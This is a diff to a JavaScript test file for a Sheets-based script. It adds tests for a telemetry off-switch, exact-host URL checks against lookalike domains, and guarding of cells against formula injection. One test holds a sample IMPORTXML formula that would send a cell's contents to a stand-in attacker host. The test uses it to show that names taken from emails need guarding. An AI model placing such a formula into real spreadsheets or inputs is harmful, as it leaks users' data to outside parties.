@@ -61,6 +61,9 @@ const EXPORTS = [
   'exceedsRecipientCap_', 'parsePretendText_', 'pretendNowIso_', 'declinedGuests_',
   'normaliseTyped_', 'unreadableAddressWarnings_', 'lastRowWithContact_',
   'failedRecipientsFrom_', 'isBounceSender_', 'installId_', 'telemetryPayload_', 'noticeFrom_',
+  // Where counting goes, and the published promise that clearing the cell
+  // switches it off. Both were wrong until 5 September 2026.
+  'telemetryUrlFrom_', 'onBlotterHost_', 'SETTING_TELEMETRY', 'TELEMETRY_URL_DEFAULT',
   'MAX_THREAD_RECIPIENTS', 'NO_CLOCK', 'VALID_STATUSES', 'CONTRACT_VERSION',
   // The look. Colour tables and widths are data, so they are testable — and a
   // typo in a hex paints a cell black on somebody's real sheet.
@@ -1166,7 +1169,18 @@ eq('and Step 1 creates it', box.expectedSetup_().settings.includes(box.SETTING_K
     const manifest = fs.readFileSync(manifestPath, 'utf8');
     eq('the manifest records the right hash', manifest.includes(sha), true);
     eq('and the right size', manifest.includes(String(Buffer.byteLength(built))), true);
-    eq('and the right version',
+
+  // `Sends to` on the site is read off the script by `publish.js`. If it ever
+  // disagrees with `SERVER_URL_DEFAULT`, the receipt line every trust page
+  // prints is wrong about the one thing a student can check against their
+  // own sheet.
+  {
+    const manifestText = fs.readFileSync(path.join(__dirname, '..', 'web', 'app', 'api', 'script', 'manifest.ts'), 'utf8');
+    const published = (manifestText.match(/SCRIPT_SENDS_TO = "([^"]+)"/) || [])[1];
+    const inScript = (src.match(/var SERVER_URL_DEFAULT = '([^']+)'/) || [])[1];
+    eq('the manifest says where a stock sheet sends', published, inScript);
+    ok('and it is on our own host', /^https:\/\/blotterib\.com\//.test(published || ''));
+  }    eq('and the right version',
       manifest.includes(JSON.stringify(box.COURIER_VERSION)), true);
   }
 }
@@ -1195,6 +1209,79 @@ eq('and Step 1 creates it', box.expectedSetup_().settings.includes(box.SETTING_K
      'coffee,chat,david,salmon');
   eq('lowercases', eventWords_('CALL With JAMIE').join(','), 'call,with,jamie');
   eq('empty text gives nothing', eventWords_('').length, 0);
+}
+
+/* ------------------------------------------------------------------ *
+ * Where counting is sent
+ *
+ * The Settings cell carries a published promise — *"Clear this cell to switch
+ * it off."* An independent review of the published script on 5 September 2026
+ * found that it did not: the successful path read the cell and the failure
+ * path posted to the hard-coded default, so a student who cleared it went on
+ * reporting every failed run forever.
+ *
+ * Both paths go through `telemetryUrlFrom_` now, and these are the three cases
+ * that have to stay apart: never set, set, and deliberately cleared.
+ * ------------------------------------------------------------------ */
+{
+  const { telemetryUrlFrom_, onBlotterHost_, SETTING_TELEMETRY, TELEMETRY_URL_DEFAULT } = box;
+
+  eq('an absent row defaults', telemetryUrlFrom_({}), TELEMETRY_URL_DEFAULT);
+  eq('a set row is used', telemetryUrlFrom_({ [SETTING_TELEMETRY]: TELEMETRY_URL_DEFAULT }),
+     TELEMETRY_URL_DEFAULT);
+  eq('a cleared cell is off', telemetryUrlFrom_({ [SETTING_TELEMETRY]: '' }), '');
+  eq('whitespace is a cleared cell', telemetryUrlFrom_({ [SETTING_TELEMETRY]: '   ' }), '');
+  ok('and an off switch is never sent to', !onBlotterHost_(telemetryUrlFrom_({ [SETTING_TELEMETRY]: '' })));
+
+  // The host check. A cell in a spreadsheet does not get to choose where a
+  // script posts, so this is exact-host rather than "contains".
+  ok('the default passes', onBlotterHost_(TELEMETRY_URL_DEFAULT));
+  ok('www passes', onBlotterHost_('https://www.blotterib.com/api/telemetry'));
+  ok('the bare host passes', onBlotterHost_('https://blotterib.com'));
+  ok('trailing space is tolerated', onBlotterHost_(' https://blotterib.com/api/telemetry '));
+  ok('a lookalike suffix fails', !onBlotterHost_('https://blotterib.com.evil.example/collect'));
+  ok('a lookalike prefix fails', !onBlotterHost_('https://notblotterib.com/api/telemetry'));
+  ok('a subdomain fails', !onBlotterHost_('https://x.blotterib.com/api/telemetry'));
+  ok('the host in a query string fails', !onBlotterHost_('https://evil.example/?u=https://blotterib.com'));
+  ok('plain http fails', !onBlotterHost_('http://blotterib.com/api/telemetry'));
+  ok('empty fails', !onBlotterHost_(''));
+  ok('undefined fails', !onBlotterHost_(undefined));
+}
+
+/* ------------------------------------------------------------------ *
+ * The Found round trip
+ *
+ * A leading apostrophe is Sheets' way of marking a cell as text. It is not
+ * part of the value, so a name guarded on the way into the Found tab comes
+ * back off it bare, and has to be guarded again on the way into Contacts.
+ *
+ * These pin the property that makes that necessary: guarding is not sticky,
+ * so it has to happen at every write. `addApprovedContacts_` needs a live
+ * spreadsheet and cannot be exercised here; this is the reasoning underneath
+ * it, kept where it will fail if somebody decides one guard is enough.
+ * ------------------------------------------------------------------ */
+{
+  const { safeCell_ } = box;
+
+  // A display name is chosen by whoever sent the email, so this is the shape
+  // a stranger can put into a Found suggestion.
+  const attack = '=IMPORTXML("https://evil.example/?d="&A2,"//a")';
+  eq('a formula name is guarded going in', safeCell_(attack), "'" + attack);
+
+  // What Sheets hands back is the value without the marker, which is the
+  // original formula again. Guarding it a second time is not a no-op on a
+  // value that has been through a cell, and that is the whole point.
+  eq('and the value read back is bare again', "'" + attack !== attack, true);
+  eq('so it must be guarded a second time', safeCell_(attack), "'" + attack);
+
+  // The other openers Sheets will evaluate.
+  ['+1+1', '-1+1', '@SUM(A1)', '\tx', '\rx'].forEach((bad) => {
+    eq(`guards ${JSON.stringify(bad)}`, safeCell_(bad).charAt(0), "'");
+  });
+
+  // And an ordinary name is left exactly alone.
+  eq('an ordinary name is untouched', safeCell_('Kleopatra Kirkland'), 'Kleopatra Kirkland');
+  eq('an address is untouched', safeCell_('jane@acme.com'), 'jane@acme.com');
 }
 
 console.log(fails === 0
